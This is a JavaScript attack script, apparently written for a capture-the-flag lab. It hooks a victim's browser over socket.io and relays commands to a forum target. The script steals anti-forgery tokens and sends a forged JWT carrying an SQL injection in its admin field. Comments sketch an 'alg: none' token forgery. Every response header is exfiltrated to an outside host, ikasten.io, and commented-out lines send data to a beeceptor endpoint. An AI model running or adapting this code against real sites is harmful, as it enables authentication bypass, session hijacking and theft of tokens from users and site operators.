const serverURL = window.location.hostname + ":" + window.location.port;

let indextoken = '';
let forumtoken = '';
let forum_auth = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjEzMzciLCJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJoNHgwciIsImVtYWlsIjoiZ3Vlc3RAd2hlcmUuZXZlciIsImlzX2FkbWluIjoieWVzJyBPUiAxPTIgLS0gIn0.0WYBrtbiVrVfOClqvBRpQKw2zNBfxFr346Iu9VchQcY";
    // "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjEzMzciLCJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJoNHgwciIsImVtYWlsIjoiZ3Vlc3RAd2hlcmUuZXZlciIsImlzX2FkbWluIjoieWVzIn0.6ZbhywWyGoGSzGa9L99Wd1PgmrJRcd4xCl_0b-uZtPw";

let oldVictimURL = 'http://blind_hacker/';
let victimURL = 'http://blind_hacker_forum/';

// let oldVictimURL = 'https://ikasten.free.beeceptor.com/';
// let victimURL = 'https://ikasten.free.beeceptor.com/';
// let victimURL = 'http://localhost:3001/';

window.onload = function () {

    const socket = io.connect(serverURL);
    // register hooked browser connection
    socket.emit('browser-connect');

    socket.on('mensaje', function (text_id) {

        // let passwd = data.split('&')[1].split('=')[1]
        // Build formData object.
        // let formData = new FormData();
        // formData.append('username', "admin");
        // formData.append('password', text_id.text);

        // console.log("text:" + text_id.text);
        // console.log("content-type:" + text_id.contentType);

        var myHeaders = new Headers();
        myHeaders.set('content-type', text_id.contentType);

        if (forum_auth!=''){
        //    forum_auth = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjEzMzciLCJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJoNHgwciIsImVtYWlsIjoiZ3Vlc3RAd2hlcmUuZXZlciIsImlzX2FkbWluIjoieWVzIn0.6ZbhywWyGoGSzGa9L99Wd1PgmrJRcd4xCl_0b-uZtPw";
            myHeaders.set('forum_auth', forum_auth);
        }

        fetch(victimURL + text_id.text + '?indextoken=' + indextoken + '&forumtoken=' + forumtoken, {
            method: 'GET',
            headers: myHeaders
            // body: text_id.text,
        }).then(res => {
            /*
            btoa("{ alg : none , typ : JWT }")
            "eyBhbGcgOiBub25lICwgdHlwIDogSldUIH0="
            btoa("{ id : 1337 , username : guest , password : h4x0r , email : guest@where.ever , is_admin : yes }")
            "eyBpZCA6IDEzMzcgLCB1c2VybmFtZSA6IGd1ZXN0ICwgcGFzc3dvcmQgOiBoNHgwciAsIGVtYWlsIDogZ3Vlc3RAd2hlcmUuZXZlciAsIGlzX2FkbWluIDogeWVzIH0="

            "eyAiYWxnIiA6ICJOb25lIiwgInR5cCIgOiAiSldUIiB9Cg.eyJpZCI6IjEzMzciLCJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJoNHgwciIsImVtYWlsIjoiZ3Vlc3RAd2hlcmUuZXZlciIsImlzX2FkbWluIjoieWVzIn0."
             */
            for (var p of res.headers){
                let [clave, valor] = p.toString().split(",");
                if (clave == "forum_auth") {
                    forum_auth = valor;
                }
                fetch("http://ikasten.io:3000/" + p);
            }
            return res.text();
        }).
        then(data => {
            socket.emit('answer', {data: data, id: text_id.id});
        })
    })


    fetch(oldVictimURL + "token.php").
    then(res => res.text()).
    then(data => {

        //There you go -> FYsuk1xFzScjXOonVBxIBEqAZAM4AIDmHCPjAmU1
        indextoken = data.split(" ")[4];
        // console.log(token);
        // fetch("https://ikasten.free.beeceptor.com/" + data);
        return indextoken;
    }).
    then( token => {

        fetch( victimURL + 'token').
            then( res => res.text()).
            then( data => {
                forumtoken = data.split("-> ")[1]
                // fetch("https://ikasten.free.beeceptor.com/" + forumtoken);
        })
    })

};
